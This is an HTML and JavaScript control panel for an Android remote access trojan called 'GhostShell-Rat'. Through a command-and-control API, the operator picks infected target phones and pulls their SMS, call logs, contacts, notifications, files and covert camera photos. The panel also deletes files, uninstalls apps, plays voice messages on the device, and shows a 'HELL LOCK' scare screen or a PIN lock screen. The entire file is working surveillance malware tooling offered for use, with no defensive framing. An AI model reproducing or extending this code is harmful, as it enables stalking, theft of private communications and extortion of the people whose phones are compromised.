<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostShell v3.7.1</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', system-ui; }
        :root { --bg:#0b0f0e; --surface:#141a1a; --primary:#00ffc3; --secondary:#ff3b9e; --text:#dbdbdb; --dim:#8fadad; }
        body { background:var(--bg); color:var(--text); padding:10px; overflow-x:hidden; }
        .app-container { max-width:1200px; margin:0 auto; display:grid; grid-template-columns:260px 1fr; gap:15px; }
        .panel { background:var(--surface); border:1px solid var(--primary); border-radius:20px; padding:15px; box-shadow:0 0 15px rgba(0,255,195,0.1); }
        .header { grid-column:1/-1; display:flex; justify-content:space-between; align-items:center; }
        .device-item { background:#1b2626; padding:12px; border-radius:12px; margin-bottom:8px; cursor:pointer; border:1px solid transparent; transition:0.3s; }
        .device-item.active { border-color:var(--secondary); box-shadow:0 0 10px var(--secondary); }
        .status-bar { display:flex; justify-content:space-between; background:#0f1818; padding:10px 15px; border-radius:30px; margin-bottom:15px; border:1px solid #222; font-size:0.9rem; }
        .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(110px, 1fr)); gap:10px; }
        .btn { background:#1b2828; border:1px solid #2f4040; border-radius:18px; padding:15px 5px; text-align:center; color:var(--primary); cursor:pointer; font-size:0.8rem; }
        .btn i { display:block; font-size:1.8rem; margin-bottom:8px; color:var(--secondary); }
        .btn:hover { border-color:var(--primary); box-shadow:0 0 15px var(--primary); }
        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:100; align-items:center; justify-content:center; padding:15px; }
        .modal-card { background:var(--surface); width:100%; max-width:800px; max-height:85vh; border-radius:25px; border:1px solid var(--primary); display:flex; flex-direction:column; overflow:hidden; }
        .modal-body { padding:15px; overflow-y:auto; flex:1; background:#121d1d; font-size:0.9rem; }
        .modal-footer { padding:12px; background:#0c1616; display:flex; gap:8px; flex-wrap:wrap; border-top:1px solid #222; }
        table { width:100%; border-collapse:collapse; }
        th { color:var(--primary); border-bottom:1px solid #333; padding:8px; text-align:left; }
        td { padding:8px; border-bottom:1px solid #1a2525; color:#ccc; }
        input, textarea { background:#1e2e2e; border:1px solid #3b5e5e; padding:12px 15px; border-radius:15px; color:#fff; width:100%; }
        button { background:var(--primary); color:#000; font-weight:bold; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; }
        .red-btn { background:var(--secondary); color:#fff; }
        @media (max-width:700px) { .app-container { grid-template-columns:1fr; } }
    </style>
</head>
<body>
    <div class="app-container">
        <header class="panel header">
            <h1 style="font-size:1.5rem; color:var(--primary);"><i class="fas fa-skull"></i> GhostShell-Rat</h1>
            <div style="color:var(--secondary); font-size:1.2rem;"><i class="fas fa-ghost"></i> ONLINE</div>
        </header>
        <div class="panel">
            <h3 style="color:var(--secondary); margin-bottom:10px;"><i class="fas fa-satellite"></i> TARGETS</h3>
            <div id="device-list">Scanning...</div>
        </div>
        <div class="panel">
            <div class="status-bar">
                <span>üéØ Target: <b id="sel-info" style="color:var(--primary)">None</b></span>
                <span>üì∂ Connection: <b id="conn-stat" style="color:red">OFFLINE</b></span>
            </div>
            <div class="grid" id="main-grid"></div>
        </div>
    </div>

    <div id="modal" class="modal">
        <div class="modal-card">
            <div class="modal-header" style="padding:15px; background:#101b1b; display:flex; justify-content:space-between; align-items:center;">
                <h3 id="modal-title" style="color:var(--secondary)">MODAL</h3>
                <span style="cursor:pointer; font-size:1.5rem;" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body" id="modal-body"></div>
            <div class="modal-footer" id="modal-footer"></div>
        </div>
    </div>

    <script>
        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", flash = false, mediaRecorder, audioChunks = [];

        async function cmd(c, b={}) {
            if(!selId) return;
            await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd:c, client_id:selId, ...b})});
        }

        function openModal(t) {
            curMod = t; hash = "";
            document.getElementById('modal').style.display = 'flex';
            document.getElementById('modal-title').innerText = t.toUpperCase();
            
            const b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
            b.innerHTML = ""; f.innerHTML = "";

            if(t === 'open_url') {
                b.innerHTML = `<p>Target Link:</p><input id="ourl" value="https://google.com">`;
                f.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
                return;
            } else if(t === 'vibrate') {
                b.innerHTML = `<p>Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
                f.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">START VIBRATE</button>`;
                return;
            } else if(t === 'panic') {
                b.innerHTML = `<p>Duration (Seconds):</p><input type="number" id="psec" value="30"><p style="margin-top:10px;">Scary Message:</p><textarea id="pmsg" style="height:100px;">SYSTEM FAILURE!</textarea>`;
                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="const msg=document.getElementById('pmsg').value.replace(/\\n/g,'<br>'); cmd('panic '+document.getElementById('psec').value+'|'+msg)">üî• ACTIVATE HELL LOCK</button><button onclick="cmd('stop_panic')">STOP</button>`;
                return;
            } else if(t === 'setwallpaper') {
                b.innerHTML = `<p>Upload Image:</p><input type="file" onchange="uploadWall(this)"><p style="margin-top:15px;">Or Direct URL:</p><input id="wurl" placeholder="https://domain.com/img.jpg">`;
                f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY URL</button>`;
                return;
            } else if(t === 'voice') {
                b.innerHTML = `<div style="text-align:center; padding:20px;"><i id="v-icon" class="fas fa-microphone" style="font-size:3rem; color:var(--dim)"></i><p id="v-stat" style="margin-top:15px;">Ready to record...</p></div>`;
                f.innerHTML = `<button id="v-start" onclick="startRec()">START RECORDING</button><button id="v-stop" onclick="stopRec()" style="display:none" class="red-btn">STOP & SEND</button>`;
                return;
            }

            const map = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo' };
            if(map[t]) cmd(map[t]);
            render();
        }

        async function startRec() {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);
            audioChunks = [];
            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
            mediaRecorder.onstop = sendAudio;
            mediaRecorder.start();
            document.getElementById('v-icon').style.color = 'red';
            document.getElementById('v-stat').innerText = 'Recording...';
            document.getElementById('v-start').style.display = 'none';
            document.getElementById('v-stop').style.display = 'inline-block';
        }
        function stopRec() { mediaRecorder.stop(); }
        async function sendAudio() {
            document.getElementById('v-stat').innerText = 'Uploading to C2...';
            const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
            const formData = new FormData();
            formData.append('file', audioBlob);
            const res = await fetch('/api/upload_voice', { method: 'POST', body: formData });
            const data = await res.json();
            if(data.status === 'ok') {
                cmd('play_voice ' + window.location.origin + '/captured_images/' + data.filename);
                document.getElementById('v-stat').innerText = 'Sent! Target is hearing you.';
            }
        }

        async function uploadWall(input) {
            const formData = new FormData(); formData.append('file', input.files[0]);
            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
            const data = await res.json();
            if(data.status === 'ok') cmd('set_wallpaper ' + window.location.origin + '/captured_images/' + data.filename);
        }

        function closeModal() {
            if(curMod === 'gallery') cmd('exit_gallery');
            if(curMod === 'filemanager') cmd('exit_shell');
            document.getElementById('modal').style.display = 'none'; curMod = null;
        }

        function render() {
            if(!curMod || !selId || !cache[selId]) return;
            if(['panic', 'vibrate', 'open_url', 'setwallpaper', 'voice'].includes(curMod)) return;
            const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
            const curHash = JSON.stringify(d[curMod] || d.info || "");
            if(hash === curHash) return; hash = curHash;
            b.innerHTML = ""; f.innerHTML = "";

            if(curMod === 'sms') {
                b.innerHTML = `<table><tr><th>Sender</th><th>Text</th></tr>${d.sms.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
            } else if(curMod === 'calls') {
                b.innerHTML = `<table><tr><th>Number</th><th>Dur</th></tr>${d.calls.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
            } else if(curMod === 'apps') {
                b.innerHTML = `<table><tr><th>App</th><th>PKG</th></tr>${d.apps.map(a=>`<tr><td>${a.appName}</td><td><button onclick="cmd('run ${a.packageName}')">Run</button> <button class="red-btn" onclick="cmd('uninstall ${a.packageName}')">X</button></td></tr>`).join('')}</table>`;
            } else if(curMod === 'contacts') {
                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
            } else if(curMod === 'filemanager') {
                const fm = d.fm;
                b.innerHTML = `<div style="background:#0a1212; padding:8px; border-radius:10px; font-family:monospace; font-size:0.75rem; color:var(--primary); margin-bottom:10px;">üìÇ ${fm.path}</div>
                               <table>${fm.files.map(x=>`<tr><td>${x.isDirectory?'üìÅ':'üìÑ'}</td><td onclick="cmd('${x.isDirectory?'cd':'get'} ${x.name}'); if('${x.isDirectory}'=='true') cmd('ls');" style="cursor:pointer;">${x.name}</td><td style="text-align:right"><button onclick="cmd('del ${x.name}'); cmd('ls');">DEL</button></td></tr>`).join('')}</table>`;
            } else if(curMod === 'info') {
                const i = d.info;
                b.innerHTML = `<table><tr><td>Model</td><td>${i.Model}</td></tr><tr><td>Battery</td><td>${i.Battery}</td></tr><tr><td>WiFi</td><td>${i.WiFi}</td></tr><tr><td>SIM 1</td><td>${i['SIM 1']}</td></tr><tr><td>Number</td><td>${i.PhoneNumber}</td></tr></table>`;
            } else if(curMod.includes('pic')) {
                const m = d.media;
                b.innerHTML = `<div style="text-align:center;"><img src="${m.is_direct?'data:image/jpeg;base64,'+m.last_img:'/captured_images/'+m.last_img}" style="width:100%; border-radius:15px;"></div>`;
            } else if(curMod === 'notifications') {
                b.innerHTML = `<table><tr><th>App</th><th>Message</th></tr>${d.notifications.map(n=>`<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
            } else if(curMod === 'toast') {
                b.innerHTML = `<p>Msg:</p><textarea id="lmsg">LOCKED</textarea><p>PIN:</p><input id="lpin" value="1337">`;
                f.innerHTML = `<button onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK</button><button onclick="cmd('unlock')">UNLOCK</button>`;
            }
        }

        async function poll() {
            try {
                const res = await fetch('/api/status');
                state = await res.json();
                document.getElementById('device-list').innerHTML = state.devices.map(d=>`<div class="device-item ${selId===d.id?'active':''}" onclick="selId='${d.id}'; updateMain();">${d.model}<br><small>${d.id}</small></div>`).join('') || "Scanning...";
                if(selId) {
                    const dres = await fetch(`/api/data/${selId}`);
                    cache[selId] = await dres.json();
                    if(curMod) render();
                }
            } catch(e){}
            setTimeout(poll, 3000);
        }

        function updateMain() {
            const e = !!selId;
            document.getElementById('sel-info').innerText = selId || "None";
            document.getElementById('conn-stat').innerText = e ? "ONLINE":"OFFLINE";
            document.getElementById('conn-stat').style.color = e ? "#00ffc3":"#ff3b9e";
            const btns = [
                {id:'panic', i:'fa-triangle-exclamation', l:'HELL LOCK'}, {id:'voice', i:'fa-microphone', l:'SEND VOICE'},
                {id:'vibrate', i:'fa-mobile-vibration', l:'VIBRATE'}, {id:'info', i:'fa-circle-info', l:'INFO'},
                {id:'contacts', i:'fa-address-book', l:'CONTACTS'}, {id:'sms', i:'fa-sms', l:'SMS'},
                {id:'calls', i:'fa-phone', l:'CALLS'}, {id:'filemanager', i:'fa-folder', l:'FILES'},
                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
                {id:'apps', i:'fa-th', l:'APPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
                {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'SYSTEM LOCK'},
                {id:'open_url', i:'fa-globe', l:'OPEN URL'}
            ];
            document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
        }
        poll();
    </script>
</body>
</html>
